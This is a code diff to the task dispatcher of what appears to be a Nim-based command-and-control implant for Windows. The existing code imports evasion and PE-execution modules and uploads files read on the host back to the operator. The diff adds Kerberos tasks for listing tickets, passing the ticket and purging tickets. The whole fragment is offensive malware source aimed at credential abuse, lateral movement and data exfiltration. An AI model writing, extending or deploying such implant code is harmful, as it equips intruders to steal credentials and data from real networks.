@@ -1,7 +1,7 @@
 ## Command dispatcher for Nim agent.
 import winim/lean, winim/inc/tlhelp32
 import std/[os, osproc, strutils, strformat, json, random, base64]
-import config, transport, evasion, pe_exec
+import config, transport, evasion, kerberos, pe_exec
 
 var sleepSecDyn* = SleepSec
 var jitterDyn*   = JitterPct
@@ -409,5 +409,11 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       t.uploadFile(id, extractFilename(args), data)
       t.sendResult(id, "uploaded " & $data.len & " bytes", "")
     except: t.sendResult(id, "", "read failed: " & getCurrentExceptionMsg())
+  of "KERB_LIST":
+    t.sendResult(id, kerberosListTickets(), "")
+  of "KERB_PTT":
+    t.sendResult(id, kerberosPassTheTicket(args), "")
+  of "KERB_PURGE":
+    t.sendResult(id, kerberosPurge(), "")
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
